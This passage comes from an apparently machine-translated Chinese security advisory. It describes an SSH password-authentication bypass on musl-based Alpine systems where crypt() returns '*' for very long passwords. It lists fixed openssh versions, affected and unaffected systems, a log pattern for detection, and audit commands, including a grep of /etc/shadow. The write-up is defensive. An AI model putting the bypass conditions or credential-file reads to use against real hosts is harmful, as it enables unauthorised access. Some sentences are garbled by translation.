style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">密码长度</span></span></font></font></td><td style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf=""><span textstyle="" style="font-size: 15px;">257–1024 字节</span></span></font></font></td></tr></tbody></table>  
如果缺少其中任何一项，绕过方法都将失效。仅仅拥有 musl 并不会使系统变得脆弱。构建配置、身份验证设置、影子条目、可用盐源和密码长度的所有要素都必须完全匹配。  
  
对于 root 账户，PermitRootLogin还必须允许密码验证。默认prohibit-password设置专门阻止针对 root 账户的此类攻击，但不会保护其他受*Shadow 保护的账户。  
  
**存在漏洞的 Alpine 版本（按分支分类**） （来源：Alpine 安全公告）：  
<table><thead><tr><th data-colwidth="105" style="padding: 8px 12px;font-weight: 600;color: rgb(31, 35, 40);text-align: left;border: 1px solid rgb(228, 231, 235);vertical-align: top;background: rgb(246, 248, 250);"><section><span leaf="">版本号</span></section></th><th data-colwidth="223" style="padding: 8px 12px;font-weight: 600;color: rgb(31, 35, 40);text-align: left;border: 1px solid rgb(228, 231, 235);vertical-align: top;background: rgb(246, 248, 250);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">固定版本</span></font></font></th></tr></thead><tbody><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><section><span leaf="">edge</span></section></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-10.6_p2-r0</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.24</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-10.3_p1-r2</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.23</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-10.2_p1-r1</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.22</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-10.0_p1-r11</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.21</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-9.9_p2-r1</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.20</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-9.7_p1-r6</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.19</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-9.6_p1-r3</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.18</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-9.3_p2-r4</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.17</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-9.1_p1-r7</span></font></font></td></tr><tr style="border-bottom: 1px solid rgb(229, 229, 229);"><td data-colwidth="105" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">3.16</span></font></font></td><td data-colwidth="223" style="padding: 8px 12px;border: 1px solid rgb(228, 231, 235);text-align: left;vertical-align: top;background: rgb(251, 252, 253);"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;"><span leaf="">openssh-9.0_p1-r6</span></font></font></td></tr></tbody></table>  
Alpine 3.16–3.20 版本已不再受支持。虽然已发布了针对这些版本的修复软件包，但升级到当前受支持的 Alpine 版本（3.21 及更高版本）才是更好的选择。  
  
**值得一看：**  
- 基于自身运行 sshd 服务的容器alpine:3.x——仅当 sshd 实际运行并启用密码认证时才会暴露。  
- OpenWrt — 使用 musl，请检查 sshd 是否已启用密码验证。  
- Buildroot 和 Yocto 镜像（包含 musl 和 OpenSSH，但未使用 PAM 构建）  
**未受影响：**  
- Ubuntu、Debian、Fedora — glibc，而不是 musl  
- 启用 PAM 的系统——不同的认证路径  
- 带有“-”的系统PasswordAuthentication no永远不会访问到易受攻击的代码。  
- 未运行 sshd 的 Alpine 容器——该攻击需要一个运行中的、带有密码认证的 SSH 守护进程。  
物联网方面的确存在问题。Alpine 系统广泛应用于嵌入式设备和定制 Linux 构建中。但要实现这一点，需要启用密码验证的 sshd 服务运行。没有 sshd 服务的 Alpine 基础镜像无法实现物联网功能。  
### 检测攻击尝试  
  
Accepted password账户的影子字段为空的事件不*正常。请Failed password在同一连接上，查找同一账户、源地址和源端口紧邻的前一个事件。  
```
Failed password for victim from 192.168.1.5 port 44280 ssh2
Accepted password for victim from 192.168.1.5 port 44280 ssh2
```  
  
两条线路使用相同的端口意味着使用的是同一个 TCP 连接。这就是两步攻击模式。成功登录并不能证明此漏洞已被利用，但如果在已锁定的帐户上发现此漏洞，则需要立即展开调查。  
  
这种日志模式是一个有用的线索，但并非确凿的证据。密码先失败后成功的情况也可能是正常的。需要结合账户的影子配置、SSH 认证设置、源地址以及登录后会话的操作进行分析。  
### 如何检查自己的系统  
  
如果您运行的是 Alpine 系统：  
```
$ ssh -V
OpenSSH_10.3p1, ...
$ apk info openssh
openssh-10.3_p1-r2
```  
  
这个r2问题r1存在漏洞。r2已安装补丁。如果您看到r1任何旧版本，请升级：  
```
$ apk upgrade openssh
$ rc-service sshd restart
```  
  
此外，还应该检查一下*在启用密码验证的系统上，哪些用户处于影子账户状态：  
```
$ grep ':\*:' /etc/shadow
```  
  
如果这些帐户中有任何一个可以接收 SSH 连接并且PasswordAuthentication yes已设置，则值得对其进行审计。  
### 这教会了我们什么  
  
这并非一个复杂的漏洞。它不需要内存损坏、竞争条件或内核漏洞利用。  
  
这需要两件事同时发生：  
1. AC库*在失败时返回，而不是引发错误。  
1. 一个身份验证函数，它直接比较结果，却不检查结果是否合理。  
这两项都不是设计成漏洞的。musl对长密码的crypt()返回*是已知的行为。OpenSSH 与影子哈希进行比较也正是其预期行为。  
  
这个漏洞出现在两个系统的边界处，这两个系统各自都严格按照设计运行，但结合起来却产生了谁也没想到的结果。  
  
这就是大多数真实漏洞的运作方式。  
  
